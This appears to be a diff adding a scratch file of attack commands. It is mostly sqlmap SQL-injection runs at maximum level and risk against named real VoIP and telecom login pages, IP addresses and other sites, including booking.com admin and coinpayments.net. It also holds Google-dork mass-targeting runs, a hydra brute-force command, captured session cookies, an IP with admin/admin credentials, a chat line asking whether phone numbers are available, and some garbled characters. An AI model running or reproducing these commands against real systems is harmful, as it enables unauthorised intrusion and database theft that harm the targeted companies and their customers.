@@ -1,0 +1,134 @@
+sqlmap.py -l 9--webscarab/conversations/ --banner --auth-type="Basic" --auth-cred="usernameHere:passwordHere" --crawl=5
+
+-u "https://ssl.keyyo.com/projet/telephonie-ip.php?xtor=ADI-39" --level=5 --risk=3 --forms --dbs
+
+
+sqlmap.py -u http://webabillity.g3-tel.com/WebaBILLityPro/Login.aspx?z=c705945c-64e9-4b1e-a70f-5c272a3480d3 --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -u http://www.ave-tel.de --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+
+
+
+
+sqlmap.py -u "http://91.240.68.119/" --crawl=400 --dbs
+sqlmap.py -u "https://portal.talk-4.co.uk" --crawl=200 --dbs
+
+
+
+sqlmap.py -u http://www.scc-zip.net --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://web1.voip.fuse.net/Login/ --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u http://voip.pspn.net/interface/login.php --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+
+sqlmap.py -u https://voip.buzz-telecom.co.uk/login --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u http://voip.nomado.eu/ --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://voip.dmcibb.net/IPIPhoneUserWeb/login.jsp --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u http://www.voip.com.jm/user/login --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+
+sqlmap.py -u http://voip.esprim.it/login --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+
+sqlmap.py -u https://voip.bluelinetelecom.com/login --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://voip.sippi.ee/login_up.php --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://voip.bentleywalker.com/ --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://voip.pilsfree-servis.cz/login/ --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py -u https://ccnavi-global.com/sign-up.php --forms --batch --crawl=50 --cookie=jsessionid=12345 --level=5 --risk=3
+sqlmap.py  -g "voip" --forms --batch --crawl=500 --cookie=jsessionid=12345 --level=5 --risk=3
+
+
+hydra 69.15.146.213   -P /root/tt/pass.txt   http-form-post  "username=^USER^&"password=^PASS^&submit=^LOGIN^"
+ 
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+
+sqlmap.py -u https://tr.babytel.ca/ --forms --batch --crawl=10 --random-agent --hex --dbs --cookie=JSESSIONID=ynj35zkoq4y91nunsyqybqds8 --level=5 --risk=3 --threads 10
+
+sqlmap.py -u https://www.client-tel.ca --forms --batch --crawl=10 --random-agent --hex --dbs --cookie=ClientelCulture=en; ASP.NET_SessionId=vx0fq5ewpig0wd2n4hkj5nau --level=5 --risk=3
+
+sqlmap.py -u http://88.116.189.51/common/restart_main.html?Login=Login&PassedTime=00:00 --forms --batch --crawl=10 --random-agent --hex --dbs --level=5 --risk=3
+
+sqlmap.py -u http://msupervoz.dyndns.org/phpsysinfo/language/language.php?lang=it --forms --batch  --hex --random-agent --dbs --threads 10
+sqlmap.py -u https://admin.booking.com/?page=%2Fhotel%2Fhoteladmin%2Fgeneral%2Fbookingbutton.html%3Flang%3Dxu%3Bhotel_id%3D250202&lang=xu&lang=et&message=ERR100  --forms --batch --crawl=30 --hex --random-agent --dbs --threads 10
+
+
+
+./sqlmap.py -u "http://login.flatuse.de/index.php?decimal=4&m=clsOpenPreislisten&orderby=A6B8RGVzdGluYXRpb25CZXoyIERFU0M%3D&SearchString=/&SearchString=0026386&show[]=30&shownet=0&showprefix=1&start=1&tabid=CBB30FFC-65A3-4482-B225-572214425FF0&tax=1.19" --hex --random-agent --dbs
+
+
+
+
+
+
+
+http://www.atpservices.ws/gn/
+
+
+sqlmap.py -m jana/new.xml --forms --batch --crawl=100 --random-agent --hex --dbs --threads 10
+
+sqlmap.py -u https://www.voicetrading.com --forms --batch --crawl=100 --hex --random-agent --cookie=hsPagesViewedThisSession=2141279680,2141280160
+ --dbs --level=5 --risk=3 --threads 10
+
+
+sqlmap.py -u http://phcfg.dblhorn.com/ph-cfg/search/sh_config.php?mac=%5c&sh=MAC&vt=DEV_SET --forms --batch --crawl=100 --hex --random-agent --dbs --cookie=hsPagesViewedThisSession=2141279680,2141280160
+
+sqlmap.py -u http://104.41.187.20/APP/webroot/index.php  --forms --batch --crawl=100 --hex --random-agent --dbs
+
+
+sqlmap.py -u  https://196.12.184.154/polycom/database.php    --forms --batch --crawl=100 --hex --random-agent --dbs
+
+./sqlmap.py --cookie="CAKEPHP=18135a4e9a09c750ad0801f1a3f26dc1" -u "http://voip.californiatelecom.com/vendors/download-csv.php" --dbs
+
+
+
+ --level=5 --risk=3
+
+-u "http://213.247.126.62:8080/app/berogui/includes/login.php?reason=cred_empty" --cookie="PHPSESSID=ce8361174666046e07d037ee14290f30" --dbs
+------------------------
+sqlmap.py -u http://213.247.126.62:8080/app/berogui/includes/login.php --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+screen python ./sqlmap.py -u https://www.coinpayments.net   --threads=10 --forms --batch --crawl=100 --hex --random-agent --dbs --level=3 --risk=3
+
+ÃœÌœ
+screen python ./sqlmap.py -u https://voip.ipvoice.att.com/upload.asp --forms --batch --crawl=100 --hex --random-agent -v 4 --dbs --dbms=mysql --threads=10 --level=5 --risk=3
+
+screen python ./sqlmap.py -m voip/1.xml --forms --batch --crawl=100 --hex --random-agent -v 4 --dbs --dbms=mysql --threads=10   »Ã—» „Ã„Ê⁄… „Ê«ﬁ⁄
+
+sqlmap.py -u https://93.63.160.251/loginnew.php --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+
+sqlmap.py -g "site:voip.*.* login" --forms --crawl=50 --batch --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -g "site:account.*.*  voip" --forms --crawl=100 --batch --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -g "site:login.*.* telecom" --forms --crawl=50 --batch --hex --random-agent --dbs --gpage=1000 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+sqlmap.py -g "site:*telecom.*  -git  login" --forms --crawl=100 --batch --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -g "site:*telecom.*  voip" --forms --crawl=100 --batch --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -g "site:*voip.*  login" --forms --crawl=100 --batch --hex --random-agent --dbs --level=5 --risk=3
+sqlmap.py -g "site:*/voip/*  login" --forms --crawl=100 --batch --hex --random-agent --dbs
+
+
+sqlmap.py --forms --crawl=50 --batch --hex --random-agent --dbs --gpage=1000 
+
+ÌÃ» ﬂ «»… «Ï „‰Â„ «⁄·Ï ›Ï «·«„—
+sqlmap.py: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, -x, --wizard, --update, --purge-output or --dependencies), use -h for basic or -hh for advanced help
+
+
+
+
+
+
+./sqlmap.py -u http://212.101.4.14/login.php --forms --batch --crawl=50 --hex --random-agent --dbs --level=5 --risk=3
+
+
+sqlmap.py -u http://189.14.80.252/bilhetador.OLD/login.php  --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+
+
+https://103.6.51.115:8443
+
+http://216.221.132.9:8080/        admin              admin
+
+[01:33:36 ’] Mohammad: 16054755948
+[01:34:08 ’] Mohammad: Are the numbers available
+
+sqlmap.py -u https://app.hostedphone.biz/pbx/login.php  --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+
+sqlmap.py -u https://secure.yourvoipcompany.com/users/slogin.php --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
+
+sqlmap.py -g "ext:php intitle:voip intext:Forgot Password" --forms --crawl=100 --batch --hex --random-agent --dbs --level=5 --risk=3
+
+
+
+sqlmap.py -u http://81.82.254.51:5000/login.jsp --forms --batch --crawl=100 --hex --random-agent --dbs --level=5 --risk=3
